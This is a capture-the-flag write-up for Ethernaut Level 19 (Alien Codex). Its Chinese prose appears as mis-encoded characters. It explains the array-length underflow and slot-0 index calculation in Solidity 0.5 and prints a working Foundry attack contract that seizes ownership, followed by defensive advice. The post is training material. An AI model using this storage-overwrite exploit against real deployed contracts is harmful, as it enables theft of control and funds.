---
title: 'Ethernaut Level 19: Alien Codex - åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ'
date: 2025-01-25 16:40:00
updated: 2025-01-25 16:40:00
categories:
  - Ethernaut ç³»åˆ—
  - è¿›é˜¶æ”»å‡»ç¯‡ (11-20)
tags:
  - Ethernaut
  - Foundry
  - Storage Manipulation
  - Array Underflow
  - æ™ºèƒ½åˆçº¦å®‰å…¨
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "åˆ©ç”¨ Solidity 0.5.0 ç‰ˆæœ¬ä¸­çš„æ•´æ•°ä¸‹æº¢æ¼æ´ï¼Œå°†åŠ¨æ€æ•°ç»„çš„é•¿åº¦æ‰©å±•åˆ°æ•´ä¸ªåˆçº¦å­˜å‚¨ç©ºé—´ã€‚é€šè¿‡ç²¾ç¡®è®¡ç®—å­˜å‚¨æ§½ä½ï¼Œå®ç°å¯¹ `owner` å˜é‡çš„è¦†ç›–ï¼ŒæŒæ¡ Alien Codex å…³å¡çš„ç ´è§£æŠ€å·§ã€‚"
---

# ğŸ¯ Ethernaut Level 19: Alien Codex - åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ

> **å…³å¡é“¾æ¥**: [Ethernaut Level 19 - Alien Codex](https://ethernaut.openzeppelin.com/level/19)  
> **æ”»å‡»ç±»å‹**: å­˜å‚¨æ“çºµ / æ•´æ•°ä¸‹æº¢  
> **éš¾åº¦**: â­â­â­â­â­

## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡

æœ¬å…³çš„ç›®æ ‡æ˜¯è·å– `AlienCodex` åˆçº¦çš„æ‰€æœ‰æƒã€‚è¿™æ˜¯ä¸€ä¸ªç»§æ‰¿äº† `Ownable` çš„åˆçº¦ï¼Œ`owner` å­˜å‚¨åœ¨ slot 0ã€‚

![Alien Codex Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg)

## ğŸ” æ¼æ´åˆ†æ

`AlienCodex` åˆçº¦ä½¿ç”¨äº†ä¸€ä¸ªæ—§çš„ Solidity ç‰ˆæœ¬ (`^0.5.0`)ï¼Œè¿™æ„å‘³ç€æ•´æ•°æ“ä½œä¸ä¼šè¿›è¡Œæº¢å‡ºæ£€æŸ¥ã€‚è¿™æ˜¯æœ¬å…³çš„æ ¸å¿ƒæ¼æ´ã€‚åˆçº¦çš„å­˜å‚¨å¸ƒå±€å¦‚ä¸‹ï¼š

| Slot | å˜é‡å    | ç±»å‹        | è¯´æ˜                                     |
| :--- | :-------- | :---------- | :--------------------------------------- |
| 0    | `contact` | `bool`      | ä¸ `owner` æ‰“åŒ…åœ¨åŒä¸€ä¸ªæ§½ä½              |
| 0    | `owner`   | `address`   | ç»§æ‰¿è‡ª `Ownable`ï¼Œä½äº slot 0            |
| 1    | `codex`   | `bytes32[]` | åŠ¨æ€æ•°ç»„ï¼Œslot 1 å­˜å‚¨å…¶é•¿åº¦              |

åˆçº¦ä¸­çš„å‡½æ•°éƒ½å—åˆ° `contacted` ä¿®é¥°ç¬¦çš„é™åˆ¶ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆè°ƒç”¨ `makeContact()` å°† `contact` è®¾ç½®ä¸º `true`ã€‚

å…³é”®æ¼æ´åœ¨ `retract()` å‡½æ•°ä¸­ï¼š

```solidity
// From AlienCodex.sol (Solidity v0.5.0)
function retract() public contacted {
    codex.length--;
}
```

ç”±äºæ²¡æœ‰æº¢å‡ºæ£€æŸ¥ï¼Œå¦‚æœ `codex.length` ä¸º0ï¼Œæ‰§è¡Œ `codex.length--` ä¼šå¯¼è‡´æ•´æ•°ä¸‹æº¢ï¼Œä½¿å…¶é•¿åº¦å˜ä¸º `2**256 - 1`ã€‚ä¸€ä¸ªé•¿åº¦ä¸º `2**256 - 1` çš„åŠ¨æ€æ•°ç»„å¯ä»¥è¦†ç›–æ•´ä¸ªåˆçº¦çš„å­˜å‚¨ç©ºé—´ï¼

æ‹¥æœ‰ä¸€ä¸ªå¯ä»¥å†™åˆ°ä»»æ„å­˜å‚¨ä½ç½®çš„æ•°ç»„åï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è¦†ç›– slot 0 ä¸­çš„ `owner` å˜é‡ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°å“ªä¸ªæ•°ç»„ç´¢å¼• `i` å¯¹åº”äºå­˜å‚¨æ§½ `0`ã€‚

åŠ¨æ€æ•°ç»„çš„æ•°æ®å­˜å‚¨ä½ç½®æ˜¯ä» `keccak256(p)` å¼€å§‹çš„ï¼Œå…¶ä¸­ `p` æ˜¯æ•°ç»„é•¿åº¦æ‰€åœ¨çš„æ§½ä½ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œ`codex` çš„é•¿åº¦å­˜å‚¨åœ¨ slot 1ï¼Œæ‰€ä»¥å®ƒçš„æ•°æ®èµ·å§‹ä½ç½®æ˜¯ `keccak256(1)`ã€‚

-   `codex[0]` å­˜å‚¨åœ¨ `keccak256(1)`
-   `codex[i]` å­˜å‚¨åœ¨ `keccak256(1) + i`

æˆ‘ä»¬æƒ³å†™å…¥çš„ä½ç½®æ˜¯ slot 0ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç´¢å¼• `i`ï¼Œä½¿å¾— `keccak256(1) + i` åœ¨ `2**256` çš„æ¨¡è¿ç®—ä¸‹ç­‰äº `0`ã€‚

`keccak256(1) + i = 2**256`
`i = 2**256 - keccak256(1)`

ä¸€æ—¦æˆ‘ä»¬è®¡ç®—å‡ºè¿™ä¸ªç´¢å¼• `i`ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ `revise(i, our_address)` æ¥å°† `owner` ä¿®æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±çš„åœ°å€ã€‚

## ğŸ’» Foundry å®ç°

### æ”»å‡»åˆçº¦ä»£ç 

æ”»å‡»åˆçº¦å°†æ‰§è¡Œä¸Šè¿°çš„ä¸‰ä¸ªæ­¥éª¤ï¼šå»ºç«‹è”ç³»ã€è§¦å‘ä¸‹æº¢ã€è®¡ç®—ç´¢å¼•å¹¶ä¿®æ”¹ `owner`ã€‚

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/19_AlienCodex.sol";

contract AlienCodexTest is Test {
    AlienCodex instance;
    Attack attacker;
    address player;

    function setUp() public {
        player = vm.addr(1);
        instance = new AlienCodex();
        assertNotEq(instance.owner(), player);
        attacker = new Attack(address(instance));
    }

    function testAttack() public {
        vm.startPrank(player);
        attacker.attack();
        vm.stopPrank();
        assertEq(instance.owner(), player);
    }
}

contract Attack {
    AlienCodex public instance;

    constructor(address _instanceAddress) {
        instance = AlienCodex(_instanceAddress);
    }

    function attack() public {
        // 1. æˆä¸ºè”ç³»äººï¼Œç»•è¿‡ modifier
        instance.makeContact();

        // 2. è°ƒç”¨ retract() è§¦å‘æ•°ç»„é•¿åº¦ä¸‹æº¢
        instance.retract();

        // 3. è®¡ç®—è¦†ç›– slot 0 æ‰€éœ€çš„ç´¢å¼•
        uint256 slot0_index;
        unchecked {
            slot0_index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
        }

        // 4. è°ƒç”¨ revise() å°† owner ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„åœ°å€
        instance.revise(slot0_index, bytes32(uint256(uint160(msg.sender))));
    }
}
```

### å…³é”®æ”»å‡»æ­¥éª¤

1.  **è°ƒç”¨ `makeContact()`**: è§£é™¤å¯¹å…¶ä»–å‡½æ•°çš„è°ƒç”¨é™åˆ¶ã€‚
2.  **è°ƒç”¨ `retract()`**: åœ¨ `codex` æ•°ç»„ä¸ºç©ºæ—¶è°ƒç”¨ï¼Œåˆ©ç”¨æ•´æ•°ä¸‹æº¢å°†æ•°ç»„é•¿åº¦å˜ä¸º `type(uint256).max`ã€‚
3.  **è®¡ç®—ç›®æ ‡ç´¢å¼•**: è®¡ç®—å‡ºèƒ½è®©æ•°ç»„è®¿é—®â€œç¯ç»•â€åˆ°å­˜å‚¨æ§½0çš„ç´¢å¼• `i = 2**256 - keccak256(1)`ã€‚
4.  **è°ƒç”¨ `revise()`**: ä½¿ç”¨è®¡ç®—å‡ºçš„ç´¢å¼•å’Œ `player` çš„åœ°å€ä½œä¸ºå‚æ•°è°ƒç”¨ `revise`ï¼Œè¿™ä¼šè¦†ç›– slot 0 çš„å†…å®¹ï¼Œä»è€Œæ”¹å˜ `owner`ã€‚

## ğŸ›¡ï¸ é˜²å¾¡æªæ–½

1.  **ä½¿ç”¨å®‰å…¨çš„Solidityç‰ˆæœ¬**: ä» `0.8.0` ç‰ˆæœ¬å¼€å§‹ï¼ŒSolidity é»˜è®¤ä¼šå¯¹æ‰€æœ‰ç®—æœ¯è¿ç®—è¿›è¡Œä¸Šæº¢å’Œä¸‹æº¢æ£€æŸ¥ã€‚è¿™æ˜¯é˜²æ­¢æ­¤ç±»æ¼æ´æœ€ç®€å•ã€æœ€æœ‰æ•ˆçš„æ–¹æ³•ã€‚
2.  **ä½¿ç”¨ `SafeMath` åº“**: å¦‚æœå¿…é¡»ä½¿ç”¨æ—§ç‰ˆæœ¬çš„Solidityï¼Œåº”å§‹ç»ˆä½¿ç”¨ `SafeMath` æˆ–ç±»ä¼¼çš„åº“æ¥æ‰§è¡Œæ‰€æœ‰ç®—æœ¯è¿ç®—ï¼Œä»¥é˜²æ­¢æº¢å‡ºã€‚
3.  **è°¨æ…å¤„ç†åŠ¨æ€æ•°ç»„**: åŠ¨æ€æ•°ç»„çš„å­˜å‚¨ç®¡ç†å¾ˆå¤æ‚ã€‚åº”é¿å…å…è®¸ç”¨æˆ·ç›´æ¥æ§åˆ¶å¯èƒ½å¯¼è‡´å­˜å‚¨å†²çªçš„æ“ä½œï¼Œå¦‚æ— é™åˆ¶åœ°å¢åŠ æˆ–å‡å°‘æ•°ç»„é•¿åº¦ã€‚

## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯

-   **æ•´æ•°æº¢å‡º (Overflow/Underflow)**: åœ¨æ—§ç‰ˆæœ¬Solidityä¸­ä¸€ä¸ªéå¸¸å¸¸è§çš„æ¼æ´ç±»åˆ«ã€‚å½“ä¸€ä¸ªæ•´æ•°å˜é‡å¢åŠ è¶…è¿‡å…¶æœ€å¤§å€¼ï¼ˆä¸Šæº¢ï¼‰æˆ–å‡å°‘åˆ°å°äºå…¶æœ€å°å€¼ï¼ˆä¸‹æº¢ï¼‰æ—¶å‘ç”Ÿã€‚
-   **åŠ¨æ€æ•°ç»„çš„å­˜å‚¨å¸ƒå±€**: ç†è§£åŠ¨æ€æ•°ç»„çš„é•¿åº¦å’Œæ•°æ®æ˜¯å¦‚ä½•åœ¨å­˜å‚¨ä¸­å¸ƒå±€çš„ï¼Œæ˜¯å‘ç°å’Œåˆ©ç”¨å­˜å‚¨æ“çºµæ¼æ´çš„å…³é”®ã€‚
-   **`keccak256`**: EVMä¸­ç”¨äºè®¡ç®—å“ˆå¸Œçš„æ ¸å¿ƒå‡½æ•°ï¼Œå®ƒåœ¨ç¡®å®šå­˜å‚¨ä½ç½®æ—¶æ‰®æ¼”ç€é‡è¦è§’è‰²ã€‚
-   **Foundry `unchecked`**: åœ¨Solidity `^0.8.0` ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ `unchecked` å—æ¥æ•…æ„å…è®¸æº¢å‡ºï¼Œè¿™åœ¨å¤ç°æ—§ç‰ˆæœ¬æ¼æ´æˆ–è¿›è¡Œç‰¹å®šä½æ“ä½œæ—¶å¾ˆæœ‰ç”¨ã€‚

## ğŸ¯ æ€»ç»“

**æ ¸å¿ƒæ¦‚å¿µ**:
-   æ—§ç‰ˆSolidityï¼ˆ<0.8.0ï¼‰çš„æ•´æ•°è¿ç®—é»˜è®¤ä¸æ£€æŸ¥æº¢å‡ºã€‚
-   åŠ¨æ€æ•°ç»„çš„é•¿åº¦å¯ä»¥è¢«æ“çºµï¼Œä»¥è®¿é—®åˆçº¦çš„æ•´ä¸ª256ä½å­˜å‚¨ç©ºé—´ã€‚
-   åˆçº¦çš„å­˜å‚¨æ§½ä½å¯ä»¥é€šè¿‡ `keccak256` å“ˆå¸Œè¿›è¡Œç¡®å®šæ€§è®¡ç®—ã€‚

**æ”»å‡»å‘é‡**:
-   é€šè¿‡æ•´æ•°ä¸‹æº¢ä¸€ä¸ªåŠ¨æ€æ•°ç»„çš„é•¿åº¦ï¼Œè·å¾—å¯¹åˆçº¦ä»»æ„å­˜å‚¨ä½ç½®çš„å†™æƒé™ã€‚
-   è®¡ç®—å‡ºæŒ‡å‘ `owner` å˜é‡æ‰€åœ¨å­˜å‚¨æ§½ï¼ˆslot 0ï¼‰çš„æ•°ç»„ç´¢å¼•ã€‚
-   è°ƒç”¨æ•°ç»„çš„å†™å‡½æ•°ï¼ˆ`revise`ï¼‰æ¥è¦†ç›– `owner`ã€‚

**é˜²å¾¡ç­–ç•¥**:
-   å§‹ç»ˆä½¿ç”¨æœ€æ–°çš„ã€å®‰å…¨çš„Solidityç‰ˆæœ¬ã€‚
-   å¦‚æœä½¿ç”¨æ—§ç‰ˆæœ¬ï¼Œå¿…é¡»ä½¿ç”¨ `SafeMath`ã€‚
-   å¯¹æ‰€æœ‰å¤–éƒ¨è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œç‰¹åˆ«æ˜¯é‚£äº›å½±å“çŠ¶æ€å˜é‡ï¼ˆå¦‚æ•°ç»„é•¿åº¦ï¼‰çš„è¾“å…¥ã€‚

## ğŸ“š å‚è€ƒèµ„æ–™

-   [Solidity Docs: Mapping and Dynamic Arrays](https://docs.soliditylang.org/en/v0.5.0/internals/layout_in_storage.html#mappings-and-dynamic-arrays)
-   [Consensys: Integer Overflow and Underflow](https://consensys.net/diligence/blog/2018/05/integer-overflow-and-underflow/)